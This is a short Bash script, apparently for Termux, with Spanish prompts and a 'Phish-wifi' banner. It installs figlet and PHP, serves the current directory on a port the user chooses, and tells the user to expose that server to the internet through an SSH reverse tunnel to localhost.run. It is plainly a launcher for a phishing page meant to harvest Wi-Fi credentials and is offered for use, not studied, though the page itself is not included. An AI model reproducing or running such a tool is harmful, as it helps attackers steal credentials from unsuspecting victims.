#! /bin/bash

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"


#directory verification
directory=$(pwd)


if which figlet >/dev/null; then
sleep 1
echo ""
echo -e "$blue(figlet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(figlet)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;33mInstalando\e[0m \e[1;34mfiglet ...\e[0m"
sleep 3
pkg install figlet
fi

#directory verification
directory=$(pwd)


if which php >/dev/null; then
sleep 1
echo ""
echo -e "$blue(php)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(php)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;33mInstalando\e[0m \e[1;34mphp ...\e[0m"
sleep 3
pkg install php -y
fi

clear
setterm -foreground green
figlet Phish-wifi
echo ""
echo "==================Phishing================"
echo ""
echo -e -n "\e[1;32mEscribe un puerto default.[4444]\e[0m \e[1;31m➤➤\e[0m "
read a
echo ""
setterm -foreground blue
echo "=========Ejecutando localhost:$a======="
sleep 3
echo ""
echo -e "\e[1;34m=======\e[0m\e[1;37mUna vez abierto el puerto $a\e[0m\e[1;34m==\e[0m"
echo ""
echo -e "\e[1;34m=========\e[0m\e[1;37mAbre una nueva ventana\e[0m\e[1;34m========\e[0m"
echo ""
echo -e "\e[1;34m=========\e[0m\e[1;37mEjecuta\e[0m\e[1;34m========\e[0m"
echo ""
echo -e "\e[1;34m============\e[0m\e[1;37mssh -R 80:localhost:$a nokey@localhost.run \e[0m\e[1;34m==========\e[0m"
echo ""
setterm -foreground green
php -S localhost:$a
#
